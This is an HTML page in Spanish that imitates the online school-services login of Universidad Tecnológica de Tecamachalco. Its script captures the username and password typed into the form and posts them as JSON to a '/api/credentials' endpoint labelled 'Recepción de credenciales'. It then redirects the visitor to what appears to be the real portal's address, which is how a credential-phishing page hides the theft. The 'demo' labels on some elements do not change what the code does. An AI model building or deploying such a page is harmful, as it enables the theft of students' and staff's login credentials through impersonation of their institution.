<!doctype html>
<html lang="es">
  <head>
    <meta charset="utf-8" />
    <link rel="icon" href="./assets/logo.png" />
    <title>UT TECAMACHALCO</title>
    <meta
      name="description"   
    />
    <style>
      :root {
        --teal: #02a787;
        --panel-gray: #e1e1e1;
        --line-gray: #e1e1e1;
        --ink: #080808;
      }

      body {
        margin: 0;
        background: #fff;
        color: #000;
        font-family: Tahoma, Arial, sans-serif;
      }

      button,
      input {
        font: inherit;
      }

      .page-shell {
        min-width: 1000px;
        background: #fff;
      }

      .top-bar {
        height: 28px;
        border-bottom: 8px solid var(--teal);
        background: #e1e1e1;
      }

      .hero {
        height: 260px;
        padding-top: 28px;
      }

      .hero-inner {
        display: grid;
        grid-template-columns: 50% 58%;
        align-items: center;
      }

      .institutional-mark {
        display: flex;
        justify-content: center;
        align-items: center;
      }

      .institutional-mark img {
        width: 200px;
        height: 200px;
        display: block;
        margin: 0 auto;
      }

      .login-panel {
        width: 404px;
        height: 151px;
        display: grid;
        grid-template-columns: 117px 287px;
        background: #e1e1e1;
      }

      .service-mark {
        display: grid;
        place-items: center;
        padding: 0 3px;
        background: #e1e1e1;
      }

      .service-mark img {
        width: 110px;
        height: 116px;
        display: block;
      }

      .login-form {
        display: grid;
        align-content: start;
        padding: 15px 0 0;
      }

      .field-row {
        display: grid;
        grid-template-columns: 92px 195px;
        align-items: center;
        min-height: 30px;
      }

      .field-row label {
        padding-right: 0;
        font-family: 'Trebuchet MS', Arial, Tahoma, sans-serif;
        font-size: 12px;
        font-weight: 700;
        text-align: right;
      }

      .field-row input {
        width: 195px;
        height: 23px;
        border: 1px solid #999;
        border-radius: 3px;
        background: #fff;
        color: #000;
        font-family: Tahoma, Arial, sans-serif;
        font-size: 12px;
        cursor: text;
      }

      .field-row input:focus {
        outline: 2px solid var(--teal);
        outline-offset: 1px;
      }

      .button-row {
        display: flex;
        gap: 0;
        margin: 12px 0 0;
        padding-left: 92px;
      }

      .button-row button {
        width: 70px;
        height: 25px;
        padding: 1px 5px;
        border: 1px solid #999;
        border-radius: 3px;
        background: #e8eee9;
        color: #000;
        font-family: Tahoma, Arial, sans-serif;
        font-size: 11px;
        font-weight: bold;
        line-height: 1;
        cursor: pointer;
      }

      .button-row button + button {
        margin-left: 3px;
      }

      .button-row button:hover,
      .button-row button:focus-visible {
        background: #f6f6f6;
        outline: 2px solid var(--teal);
        outline-offset: 1px;
      }

      .demo-message {
        min-height: 15px;
        margin: 7px 0 0;
        color: #4e4e4e;
        font-size: 11px;
      }

      .title-band {
        border-top: 8px solid var(--teal);
        background: #e1e1e1;
        padding: 4px 0 2px;
        text-align: center;
        font-family: "CopprplGoth Bd BT", Georgia, "Times New Roman", serif;
        font-size: 16px;
        font-weight: bold;
        line-height: 1.26;
      }

      .title-band span {
        display: block;
      }

      .bottom-space {
        min-height: 190px;
      }
    </style>
  </head>
  <body>
    <main class="page-shell">
      <div class="top-bar" aria-hidden="true"></div>

      <section class="hero" aria-label="Acceso a servicios escolares">
        <div class="hero-inner">
          <div class="institutional-mark">
            <img src="./assets/logo.png" alt="Logotipo institucional" />
          </div>

          <div class="login-panel" aria-label="Panel de acceso de demostración">
            <div class="service-mark">
              <img src="./assets/miescuela.gif" alt="mi-escuela.com" />
            </div>

            <form id="login-form" class="login-form" action="/api/credentials" method="post" aria-label="Recepción de credenciales" autocomplete="off">
              <div class="field-row">
                <label for="demo-user">Usuario</label>
                <input id="demo-user" name="email" autocomplete="email" required />
              </div>
              <div class="field-row">
                <label for="demo-password">Contraseña</label>
                <input id="demo-password" name="password" type="password" autocomplete="new-password" required />
              </div>

              <div class="button-row">
                <button type="submit" id="accept-button">Aceptar</button>
                <button type="button" id="cancel-button">Cancelar</button>
              </div>
              <p class="demo-message" id="demo-message" aria-live="polite" role="status"></p>
            </form>
          </div>
        </div>
      </section>

      <section class="title-band" aria-label="Identidad del portal">
        <span>SERVICIOS ESCOLARES EN LÍNEA</span>
        <span>UNIVERSIDAD TECNOLÓGICA DE TECAMACHALCO</span>
      </section>

      <div class="bottom-space" aria-hidden="true"></div>
    </main>

    <script>
      const message = document.getElementById("demo-message");
      const form = document.getElementById("login-form");
      const userField = document.getElementById("demo-user");
      const passwordField = document.getElementById("demo-password");

      form.addEventListener("submit", async (event) => {
        event.preventDefault();
        message.textContent = "Recibiendo datos…";

        try {
          const response = await fetch(form.action, {
            method: form.method,
            headers: {
              "Content-Type": "application/json",
              Accept: "application/json",
            },
            body: JSON.stringify({
              email: userField.value,
              password: passwordField.value,
            }),
          });
          const result = await response.json();
          if (!response.ok) throw new Error(result.error || "No se pudieron recibir los datos.");
          passwordField.value = "";
          message.textContent = "Datos recibidos correctamente.";
          setTimeout(() => {
            window.location.href = "http://187.217.125.214/uttecam/acceso.asp";
            }, 1);
        } catch (error) {
          message.textContent = error.message;
        }
      });

      document.getElementById("cancel-button").addEventListener("click", () => {
        form.reset();
        message.textContent = "Campos restablecidos.";
      });
    </script>
  </body>
</html>
